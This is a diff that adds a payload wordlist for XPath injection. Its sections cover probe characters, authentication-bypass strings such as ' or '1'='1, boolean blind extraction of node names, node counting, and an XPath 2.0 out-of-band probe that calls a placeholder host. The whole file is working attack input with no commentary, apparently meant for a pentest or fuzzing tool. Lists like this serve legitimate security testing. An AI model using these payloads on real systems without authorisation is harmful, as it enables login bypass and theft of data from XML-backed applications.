@@ -1,0 +1,28 @@
+# === Detection ===
+'
+"
+'"
+]
+)
+'](
+
+# === Auth bypass ===
+' or '1'='1
+' or 1=1 or ''='
+'] | //user[username/text()='admin' and ''='
+' or name(.)='username
+admin' or '1'='1
+admin'/*
+
+# === Boolean blind ===
+' and '1'='1
+' and '1'='2
+' and string-length(name(/*[1]))=4 and ''='
+' and substring(name(/*[1]),1,1)='r' and ''='
+
+# === Node enumeration ===
+' or count(/*)=1 or ''='
+' or count(//user)>0 or ''='
+
+# === XPath 2.0 specific ===
+' or doc-available('http://{{OOB}}/') or '
